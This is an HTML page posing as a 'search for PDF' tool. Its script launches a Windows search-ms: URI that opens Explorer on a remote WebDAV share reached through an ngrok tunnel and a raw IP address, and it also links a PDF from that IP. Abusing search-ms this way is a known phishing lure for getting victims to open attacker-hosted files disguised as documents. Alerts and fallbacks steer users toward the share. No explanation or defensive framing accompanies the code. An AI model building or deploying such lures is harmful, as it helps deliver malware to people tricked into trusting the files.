<!DOCTYPE html>
<html>
<head>
  <title>Trigger Search-MS for WebDAV PDF</title>
</head>
<body>
  <h1>Open File Search</h1>
  <p>Click the button to search for the PDF, or <a href="http://38.247.64.82/share/LawsofHumanNature.pdf">view the PDF directly</a>.</p>
  <p id="browser-warning" style="display: none; color: red;">
    This feature may not work in Firefox or if the WebDAV share is inaccessible. Use Chrome/Edge or the PDF link.
  </p>
  <button onclick="openSearch()">Search for PDF</button>
  <script>
    function isFirefox() {
      return navigator.userAgent.toLowerCase().includes("firefox");
    }

    function openSearch() {
      const searchUri = "search-ms:query=LawsofHumanNature&crumb=location:\\\\https://a231-38-247-64-82.ngrok-free.app@SSL\\share";
      if (isFirefox()) {
        document.getElementById("browser-warning").style.display = "block";
        alert("Firefox may not support this feature. Try clicking the button, or use Chrome, Edge, or the PDF link.");
      }
      try {
        window.location.href = searchUri;
        setTimeout(() => {
          alert("If Windows Explorer didnâ€™t open, ensure the WebDAV share (\\\\38.247.64.82@80\\share) is accessible and contains 'LawsofHumanNature.pdf'. Try the direct PDF link.");
        }, 3000);
      } catch (e) {
        document.getElementById("browser-warning").style.display = "block";
        alert("Error launching search: " + e.message + ". Check the WebDAV share or use the PDF link.");
      }
    }
  </script>
</body>
</html>